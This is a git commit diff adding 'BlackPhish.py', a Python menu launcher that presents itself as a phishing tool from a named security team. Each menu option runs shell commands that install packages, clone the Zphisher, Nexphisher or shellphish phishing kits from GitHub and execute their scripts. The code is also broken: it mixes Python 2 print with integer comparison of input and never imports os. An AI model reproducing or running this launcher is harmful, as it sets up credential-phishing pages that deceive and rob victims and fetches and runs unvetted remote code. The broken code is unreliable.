53a25bfde4b138970e9b585a52ab5c52c75515ec
Mr0Vito <70087349+Mr0Vito@users.noreply.github.com>
2020-08-23 10:41:50 +0430

    Update BlackPhish.py

--- BlackPhish.py
+++ BlackPhish.py
@@ -1,1 +1,37 @@
 # Black-Phish
+# tool Phishing
+print"""
+\033[1;36m \n
+                                .::!!!!!!!:.
+.!!!!!:.                       .:!!!!!!!!!!!!
+~~~~!!!!!!.                .:!!!!!!!!!UWWW$$$
+    :$$NWX!!:          .:!!!!!!XUWW$$$$$$$$$P
+    $$$$$$##WX!:    .<!!!!UW$$$$"  $$$$$$$$#
+    $$$$$$  $$$UX  :!!UW$$$$$$$$$  4$$$$$$*
+    ^$$$$B  $$$$\    $$$$$$$$$$$$  d$$R"
+       "*$bd$$$$     '*$$$$$$$$$$$o+#"
+            ''''         ''''''
+\033[1;36m \n
+====================================
+#        Tool Phishing             #
+#  Black Belief Security Team      #
+#          Mr.<V>ito               #
+# Telegram:@BlackBeliefSecurityTeam#
+# My id(telegram):@Mr0Vito         #
+#           version:1              #
+====================================
+\033[1;31m \n
+[+]1:Zphisher
+[+]2:Nexphisher
+[+]3:shellphish
+
+   
+"""
+o= input('Code=>')
+
+if o== 1:
+        os.system("apt update ; apt install git curl php openssh -y ; git clone git://github.com/htr-tech/zphisher.git ; cd zphisher ; bash zphisher.sh")
+if o== 2:
+        os.system("apt update ; apt install git -y ; git clone git://github.com/htr-tech/nexphisher.git ; cd nexphisher ; bash setup ; bash nexphisher")
+if o== 3:
+        os.system("apt update ; apt install git -y ; git clone https://github.com/thelinuxchoice/shellphish ; cd shellphish ; bash shellphish.sh")
